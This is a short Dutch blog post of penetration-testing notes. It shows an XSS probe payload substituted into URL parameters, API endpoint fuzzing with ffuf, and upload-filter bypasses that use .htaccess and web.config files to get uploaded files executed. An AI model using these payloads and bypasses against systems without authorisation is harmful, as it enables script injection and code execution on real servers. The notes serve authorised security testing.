---
layout: post
title: "Pentest notes"
date: 2022-07-22
tags: [pentest]
---

Het vervangen van bepaalde query parameters in een URL over meerdere URL's met [qsreplace][qsreplace]:

{% highlight ruby linenos %}
Browse website met ZAP of Burp en sla alle URLs op een in txt.
cat urls.txt | qsreplace '<svg onload=alert(1)>'
{% endhighlight %}

---

Zorgen dat alle endpoints unique zijn met [uro][uro]:

{% highlight ruby linenos %}
Browse website met ZAP of Burp en sla alle URLs op een in txt.
cat urls.txt | uro > uniq.txt
{% endhighlight %}

---

Het fuzzen van api endpoints:

{% highlight ruby linenos %}
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -o api-log.txt -of csv -u https://DOMAIN/FUZZ
cat api-log.txt | awk -F ',' '(NR>1) {print $2,$5}' | egrep '200|301|302|403' > api-alive.txt
for url in $(cat api-alive.txt); do ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt -o api-endpoint.log -of csv -u https://$url/FUZZ;done
{% endhighlight %}

---
Het bypassen van upload filters

{% highlight ruby linenos %}
Apache door uploaden van een .htaccess file met content: AddType application/x-httpd-php .php
ISS door uploaden van een web.config file met content: <mimeMap fileExtension=".exe" mimeType="application/vnd.microsoft.portable-executable" />
{% endhighlight %}

[qsreplace]: https://github.com/tomnomnom/qsreplace
[uro]: https://github.com/s0md3v/uro